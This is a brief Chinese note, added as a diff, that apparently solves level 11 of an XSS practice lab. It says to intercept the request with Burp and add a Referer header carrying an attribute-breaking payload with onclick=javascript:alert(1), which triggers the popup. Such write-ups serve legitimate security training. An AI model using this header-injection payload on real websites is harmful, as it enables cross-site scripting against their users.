@@ -1,0 +1,10 @@
+第11关
+
+这一关通过referer
+
+利用burp抓包
+添加referer头
+referer: "onclick=javascript:alert(1) type="'
+
+
+弹窗成功！！！
